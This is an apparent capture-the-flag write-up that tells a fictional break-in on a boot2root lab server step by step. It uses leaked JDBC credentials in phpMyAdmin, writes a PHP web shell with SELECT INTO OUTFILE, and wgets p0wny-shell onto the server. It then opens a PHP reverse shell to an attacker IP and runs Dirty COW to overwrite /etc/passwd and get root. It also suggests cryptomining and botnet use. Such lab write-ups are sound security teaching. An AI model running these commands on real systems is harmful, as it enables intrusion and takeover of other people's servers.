# From Zero to Hero with COW

### ToC
0. [Introduction](#intro)
1. [The target](#target)
2. [Web Fun](#webpwn)
3. [Dirty cow & reverse shell](#cow)

## Introduction <a name=intro>
I don't know about you, but I'm of the opinion that a writeup doesn't have to be boring. To spice things a little let's pretend that we're pirates trying to gain full (root) access to a remote server.

To that purpose, we'll re-imagine the beginning of __boot2root__'s main track from the perspective of a fictional company that takes security all too lightly and then branch off to the infamous kernel exploit we're here to introduce. Everything introduced here from the 2nd section onwards can be followed after the 7th section of the first writeup.

## 1. The target <a name=target>
### Some background
First thing in order is to find an easy to hack target, for this purpose we could make use of a dedicated  engine like [shodan](https://shodan.io) or crawl SCM websites. If we were to use shodan maybe we'd look for - targets running softwares with unpatched vulnerabilities
- services running with their default credentials
- systems that really shouldn't be exposed online
And the list goes on.

### 42born2sec
Let's take a moment to introduce 42Born2Sec, 42Born2Sec is a small company that's too poor to employ a full time Ops so the developers are also in charge of maintaining the infrastructure, by extension the repositories.
Like any hip company, they love open source, so of course the code they use on production is all on github, conveniently for us.

### JDBC
Sadly for 42Born2Sec, they've made a grave mistake.
It turns out that one of their employees didn't know better and commited a JDBC string with the production credentials!
``` Java
String dbConnectionString = "jdbc:mysql://root:Fg-'kKXBj87E:aJ$@42Born2Sec.tld"
```
JDBC is an API that allows java programs to access relational databases, in this case they're using mysql for what seems to be production database, the username is `root` and the password `Fg-'kKXBj87E:aJ$`
Now to use that...

#### Notes
In this hypothetical scenario we pretended we found credentials in a github repo, but how does one actually do that?
It's actually pretty easy, you can use github's built in code search engine or a website like [this](https://shhgit.darkport.co.uk/).

## 2. Web Pwnage <a name=webpwn>
Now that we have mysql credentials, let's find a way to use them.

### Recon
We saw a domain in that jdbc string, but sadly the mySQL daemon port (__3306__) is closed on it, not like that'd be enough to stop us.

The next best thing would be some web mysql management tool, but surely they wouldn't run that on their production server, as n00bish as they are.
 ```
 https://42born2sec.tld/phpmyadmin
 ```
 Oh no.

### MyLittleForum
Welp let's just use the credentials we just found out, and next thing we know we're into phpmyadmin.

From looking at the DB, it turns out they're also running a forum using 'mylittleforum'. Interestingly they [tell people to do a permissive chmod on the subdirectory __templates_c__ ].(https://github.com/ilosuna/mylittleforum/wiki/Installation).
It would be a shame if someone were to inject a php script in that directory, so that's basically what we just did.
``` SQL
SELECT "<pre><?php echo shell_exec($_GET['e']); ?></pre>" INTO OUTFILE '/var/www/forum/templates_c/shell.php';
```

### Pwny in the shell
We now have a sucky shell at `https://42born2sec.tld/forum/templates_c/shell.php` that takes GET arguments, let's use it to bootstrap a better shell
```
https://42born2sec.tld/forum/templates_c/shell.php?e=wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O p0wny.php
```
Now that we have a decent enough shell, we could certainly mine cryptocurrencies, spy on the users(read access.log) add this machine to a botnet to DoS stuff and so forth. You can certainly do a lot in userland, but why only settle for that?

Let's start with the biggest potential win, the kernel
``` shell
p0wny@shell:…/forum/templates_c# uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```
Linux 3.2.0... that's old, dirty cow old!

## 3. Mad(vise) COW <a name=cow>

### Wut?
[Dirty cow](https://dirtycow.ninja/) (CVE[-2016-5195](https://nvd.nist.gov/vuln/detail/CVE-2016-5195)) is a Linux local privilege bug that was made public in 2017, but it has actually been exploitable since 2007. It basically works by exploiting a race condition in the Kernel's copy-on-write implementation to turn a read-only mapping into a writable one, effectively allowing any user to modify say, `/etc/passwd` and become root.

This kernel version is definitely vulnerable to dirty cow so let's do just that!

### Pwn away
Let's use the `pokemon` implementation of dirty cow,  we'll fetch it it from github and compile it, of course it needs to be linked with pthread since it's a race conditon based exploit after all.
``` shell
p0wny@shell:…/forum/templates_c# wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c
[...]
2019-11-07 22:57:53 (105 KB/s) - `pokemon.c' saved [4302/4302]
p0wny@shell:…/forum/templates_c# gcc -pthread pokemon.c -o miltank
```
#### Notes
The `madviseThread` threads tells the kernel to throw away our mapping, while it tries to inject our text within the memory, using `ptrace`, that's basically all the magic there is to it.

### "Shell".reverse() <a name=revshell>
Before going any further, let's get a nice and comfy reverse shell running, first we'll listen on one of our machines using `netcat` (note that we could use a more inconspicuous port if we didn't want to to raise suspicion).
```shell
root@kali:~# nc -lp 666
```
Great! now we just need to send a shell to it, let's do it from p0wny with good ol' `php`
``` shell
p0wny@shell:…/forum/templates_c# php -r '$s=fsockopen("<OUR IP>",666);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### It's Showtime
Let's actually use the exploit to modify root's password to __"toor"__ in `/etc/passwd` (`openssl passwd -1`), upgrade to a __tty__ and become root with `su`. Note that our entry will override the next one, so you might want to make a backup of /etc/passwd beforehand.
``` shell
www-data@BornToSecHackMe:/var/www/forum/templates_c$ ./miltank "/etc/passwd" $'root:$1$t3LoNDe6$0RictPpiKAlMMIXPByMrM1:0:0:root:/root:/bin/bash\n'
/etc/passwd                               
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, /root:$1$t3LoNDe6$0RictPpiKAlMMIXPByMrM1:0:0:root:/root:/bin/bash
                          
     //    //                              
    ^^    ^^                               
mmap b7fd9000

madvise 0

ptrace 0

www-data@BornToSecHackMe:/var/www/forum/templates_c$ python -c 'import pty; pty.spawn("/bin/bash")'   
www-data@BornToSecHackMe:/var/www/forum/templates_c$ su
Password: toor

root@BornToSecHackMe:/var/www/forum/templates_c# id
uid=0(root) gid=0(root) groups=0(root)
```
We're in! 🎉

# Conclusion
If there's one thing that's not to be neglected, it's security.

All in all, this was merely an exercise, but it's still incredible to think that a ton of businesses still haven't patched their systems for dirty COW, a three year old security issue, 42born2sec could've been any small business 🤦‍